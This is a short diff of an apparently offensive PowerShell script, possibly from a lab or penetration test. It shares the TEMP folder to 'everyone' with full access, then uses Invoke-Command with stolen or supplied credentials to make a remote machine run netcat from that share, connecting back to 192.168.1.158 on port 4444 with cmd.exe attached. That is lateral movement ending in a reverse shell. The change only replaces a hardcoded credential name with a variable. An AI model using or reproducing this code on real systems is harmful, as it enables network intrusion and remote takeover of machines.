@@ -21,4 +21,4 @@ New-SmbShare -Name "RaIny" -Path $env:TEMP -FullAccess "everyone"
 
 $me = $env:COMPUTERNAME
 
-if ($m -ne $null){ Invoke-Command -ComputerName machine-1 -Credential morty -ScriptBlock {\\$me\RaIny\nc.exe 192.168.1.158 4444 -e cmd.exe} }
+if ($m -ne $null){ Invoke-Command -ComputerName machine-1 -Credential $mycredential -ScriptBlock {\\$me\RaIny\nc.exe 192.168.1.158 4444 -e cmd.exe} }
